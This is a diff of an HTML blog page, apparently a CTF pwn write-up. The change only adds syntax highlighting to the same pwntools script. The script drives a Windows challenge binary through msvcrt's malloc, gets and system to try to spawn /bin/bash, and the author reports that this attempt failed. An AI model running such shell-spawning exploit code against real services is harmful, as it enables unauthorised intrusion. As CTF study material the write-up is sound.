@@ -1378,41 +1378,41 @@ http {
 <p><img src="https://imgur.com/GAKJAea.png" alt="image"></p>
 <h3 id="method-2">Method 2</h3>
 <p>In this way, I do the same as above, but instead of calling the WinExec function, I call <code>system</code> function of the module msvcrt.dll</p>
-<pre tabindex="0"><code class="language-python!" data-lang="python!">from pwn import *
-
-HOST = &#34;0&#34;
-PORT = 1337
-if args.LOCAL:
-    io = process([&#34;wine&#34;, &#34;challenge.exe&#34;])
-else:
-    io = remote(HOST, int(PORT))
-    
-io.sendline(b&#39;msvcrt.dll&#39;)
-io.sendline(b&#39;malloc&#39;)
-io.sendline(str(0x100).encode()) 
-
-io.recvuntil(b&#39;Result: &#39;)
-out = io.recvuntil(b&#39;\r\n&#39;).strip()
-print(out)
-heap_addr = int(out.split(b&#39;: &#39;)[-1],16)
-print(hex(heap_addr))
-
-io.sendline(b&#39;msvcrt.dll&#39;)
-io.sendline(b&#39;gets&#39;)
-io.sendline(str(heap_addr).encode())
-io.sendline(b&#39;/bin/bash&#39;)
-
-io.sendline(b&#39;msvcrt.dll&#39;)
-io.sendline(b&#39;puts&#39;)
-io.sendline(str(heap_addr).encode())
-
-io.sendline(b&#39;msvcrt.dll&#39;)
-io.sendline(b&#39;system&#39;)
-
-io.sendline(str(heap_addr).encode())
-
-io.interactive()
-</code></pre><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
+</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>print(out)
+</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>print(hex(heap_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>But when running, it failed and returned -1, I don&rsquo;t know why it happened.</p>
 <p>According to Microsoft&rsquo;s system function documentation, if calling the system function results in an error, it returns -1 and sets the error code to the global variable <code>errno</code>.</p>
 <blockquote>
 <p>If command is NULL and the command interpreter is found, returns a nonzero value. If the command interpreter isn&rsquo;t found, returns 0 and sets errno to ENOENT. If command isn&rsquo;t NULL, system returns the value that is returned by the command interpreter. It returns the value 0 only if the command interpreter returns the value 0. A return value of -1 indicates an error, and errno is set to one of the following values.</p>
